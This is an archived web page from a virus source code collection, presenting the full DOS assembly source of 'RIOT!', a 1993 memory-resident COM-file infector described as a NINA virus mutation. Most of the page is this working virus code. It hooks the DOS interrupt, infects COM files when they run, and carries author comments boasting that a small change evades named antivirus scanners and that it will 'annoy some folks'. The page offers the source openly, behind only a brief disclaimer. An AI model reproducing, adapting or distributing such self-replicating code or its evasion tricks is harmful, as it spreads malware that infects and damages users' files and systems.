<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: riot_asm</title>
<meta name="KEYWORDS" content="riot.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for riot.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="rage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rage_asm.php">rage_asm</a><br>
<a href="rammonst_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rammonst_asm.php">rammonst_asm</a><br>
<a href="rand_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rand_asm.php">rand_asm</a><br>
<a href="ranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ranger_asm.php">ranger_asm</a><br>
<a href="rapbetr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapbetr_asm.php">rapbetr_asm</a><br>
<a href="rape1882_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape1882_asm.php">rape1882_asm</a><br>
<a href="rapeiib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapeiib_asm.php">rapeiib_asm</a><br>
<a href="rape_v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape_v20_asm.php">rape_v20_asm</a><br>
<a href="rausr757_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rausr757_asm.php">rausr757_asm</a><br>
<a href="ravage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ravage_asm.php">ravage_asm</a><br>
<a href="raver_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raver_asm.php">raver_asm</a><br>
<a href="raygun2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun2_asm.php">raygun2_asm</a><br>
<a href="raygun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun_asm.php">raygun_asm</a><br>
<a href="readvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/readvir_asm.php">readvir_asm</a><br>
<a href="rec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rec_asm.php">rec_asm</a><br>
<a href="red_merc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/red_merc_asm.php">red_merc_asm</a><br>
<a href="redmerc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redmerc_asm.php">redmerc_asm</a><br>
<a href="redx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redx_asm.php">redx_asm</a><br>
<a href="replic_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/replic_d_asm.php">replic_d_asm</a><br>
<a href="republic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/republic_asm.php">republic_asm</a><br>
<a href="retal1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal1_asm.php">retal1_asm</a><br>
<a href="retal2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal2_asm.php">retal2_asm</a><br>
<a href="retal3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal3_asm.php">retal3_asm</a><br>
<a href="retal4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal4_asm.php">retal4_asm</a><br>
<a href="reyes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/reyes_asm.php">reyes_asm</a><br>
<a href="richard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richard__asm.php">richard__asm</a><br>
<a href="richards_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richards_asm.php">richards_asm</a><br>
<a href="riot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riot_asm.php">riot_asm</a><br>
<a href="rip_hd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rip_hd_asm.php">rip_hd_asm</a><br>
<a href="ritzen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ritzen_asm.php">ritzen_asm</a><br>
<a href="riverbot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riverbot_asm.php">riverbot_asm</a><br>
<a href="rizwi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rizwi_asm.php">rizwi_asm</a><br>
<a href="rna_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rna_pas.php">rna_pas</a><br>
<a href="rnd__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd__asm.php">rnd__asm</a><br>
<a href="rnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_asm.php">rnd_asm</a><br>
<a href="rnd_num_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_num_asm.php">rnd_num_asm</a><br>
<a href="romulan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/romulan_asm.php">romulan_asm</a><br>
<a href="roseanne_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roseanne_asm.php">roseanne_asm</a><br>
<a href="roz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roz_asm.php">roz_asm</a><br>
<a href="rtl4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rtl4_asm.php">rtl4_asm</a><br>
<a href="runt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_asm.php">runt_asm</a><br>
<a href="runt_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_b_asm.php">runt_b_asm</a><br>
<a href="runt-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt-b_asm.php">runt-b_asm</a><br>
<a href="rush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_asm.php">rush_asm</a><br>
<a href="rushhour_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhour_asm.php">rushhour_asm</a><br>
<a href="rushhr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhr_asm.php">rushhr_asm</a><br>
<a href="rush_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_vir_asm.php">rush_vir_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; VirusName : RIOT! - Revolution In Our Time
; Country   : Sweden
; Author    : The Unforiven / Immortal Riot
; Date	    : 15/09/1993
;
;
; This is a mutation of the NINA virus, and well,
; havn't really changed much in this code, just
; fooled Mcafee's Scan and Dr Alan Toolkit.
;
; Okey, this might not be the very best mutation born,
; but think in this way, if this mutation is so	bad
; then aren't the anti-virus products even worse ?
;
; The original virus was pretty "OK", it is a RES virus,
; non-overwriting com infector. It will infect the program
; after you have started it. It will not infect renamed
; exe files. (..It looks at the victim's fileheader..)
;
; This was originally found in Bulgaria (...where else...)
; but this one will probably be found in Sweden..<grin!>..
;
; Really hope this file will annoy some folks around,
; cuz it certainly annoyed me!..<no more comments>...
;
; This virus don't got a "trash" routine, cuz I figure
; it to very funny anyway, and when it's a resident
; virus, we can hope it'll travel around a while,
; instead of just trash the sorry swapper who gets it.
;
; Scan v108 don't find this, neither does S&S Toolkit 6.54,
; havn't tried with TBScan/F-Prot, but they will probably
; identify it as the "Nina" virus.
;
; Remember..Peace In Our Time.. ...NOT!

.model tiny
.code
org 100h
start:
;		push	ax			; Original push "ax",
                PUSH    DX			; But push dx instead,
						; and S&S FindViru can't
						; find it as NINA-256 :)

                mov     ax,9753h                ; installation check
                int     21h
                mov     ax,ds
                dec     ax
                mov     ds,ax                   ; ds->program MCB
                mov     ax,ds:[3]               ; get size word
                push    bx
                push    es
                sub     ax,40h                  ; reserve 40h paragraphs
                mov     bx,ax
                mov     ah,4Ah                  ; Shrink memory allocation
                int     21h

                mov     ah,48h                  ; Allocate 3Fh paragraphs
                mov     bx,3Fh                  ; for the virus
                int     21h

                mov     es,ax                   ; copy virus to high
                xor     di,di                   ; memory
                mov     si,offset start + 10h   ; start at MCB:110h
                mov     cx,100h                 ; (same as PSP:100h)
                rep     movsb
                sub     ax,10h                  ; adjust offset as if it
                push    ax                      ; originated at 100h
                mov     ax,offset highentry
                push    ax
                retf

highentry:
                mov     byte ptr cs:[0F2h],0AAh ; change MCB's owner so the
                                                ; memory isn't freed when 
                                                ; the program terminates
                mov     ax,3521h                ; get int 21h vector
                int     21h

                mov     word ptr cs:oldint21,bx ; save it
                mov     word ptr cs:oldint21+2,es
                push    es
                pop     ds
                mov     dx,bx
                mov     ax,2591h                ; Int 91h to int 21h
                int     21h

                push    cs
                pop     ds
                mov     dx,offset int21
                mov     al,21h              ; set int 21h to virus vector
                int     21h

                pop     ds                      ; ds->original program PSP
                pop     bx
                push    ds
                pop     es

ENDFILE         dw      100h			; Size of infected COM file

return_COM:
                mov     di,100h                 ; restore original
                mov     si,endfile              ; file
                add     si,di                   ; adjust for COM starting
                mov     cx,100h                 ; offset
                rep     movsb
                pop     ax
                push    ds                      ; jmp back to original
                mov     bp,100h                 ; file (PSP:100)
                push    bp
                retf
exit_install:
                pop     ax                      ; pop CS:IP and flags in
                pop     ax                      ; order to balance the
                pop     ax                      ; stack and then exit the
                jmp     short return_COM        ; infected COM file
int21:
                cmp     ax,9753h                ; installation check?
                je      exit_install
                cmp     ax,4B00h                ; execute?
                jne     exitint21               ; nope, quit
                push    ax                      ; save registers
                push    bx
                push    cx
                push    dx
                push    ds
                call    infect
                pop     ds                      ; restore registers
                pop     dx
                pop     cx
                pop     bx
                pop     ax
exitint21:
                db      0eah ; jmp far ptr
oldint21        dd      ?

infect:
                mov     ax,3D02h                ; open file read/write
                int     91h
                jc      exit_infect
                mov     bx,ax
                mov     cx,100h
                push    cs
                pop     ds
                mov     ah,3Fh                  ; Read first 100h bytes
                mov     dx,offset endvirus
                int     91h
                mov     ax,word ptr endvirus
                cmp     ax,'MZ'                 ; exit if EXE
                je      close_exit_infect
                cmp     ax,'ZM'                 ; exit if EXE
                je      close_exit_infect
                cmp     word ptr endvirus+2,9753h ; exit if already
                je      close_exit_infect       ; infected
                mov     al,2                    ; go to end of file
                call    move_file_pointer
                cmp     ax,0FEB0h               ; exit if too large
                ja      close_exit_infect
                cmp     ax,1F4h                 ; or too small for
                jb      close_exit_infect       ; infection
                mov     endfile,ax              ; save file size
                call    write
                mov     al,0                    ; go to start of file
                call    move_file_pointer
                mov     dx,100h                 ; write virus
                call    write
close_exit_infect:
                mov     ah,3Eh                  ; Close file
                int     91h
exit_infect:
                retn

move_file_pointer:
                push    dx
                xor     cx,cx
                xor     dx,dx
                mov     ah,42h
                int     91h
                pop     dx
                retn

write:
                mov     ah,40h	 ; 40HEX..writing to file
                mov     cx,100h
                int     91h
                retn

                db	' RIOT!' ; Revolution In Our Time!
endvirus:			                                       
                int     20h      ; original COM file
		end     start

; Greeting goes out to : Raver, Metal Militia, Scavenger, 
; and all other revolutionary coders in our time...
</textarea></td></tr></table></body></html>
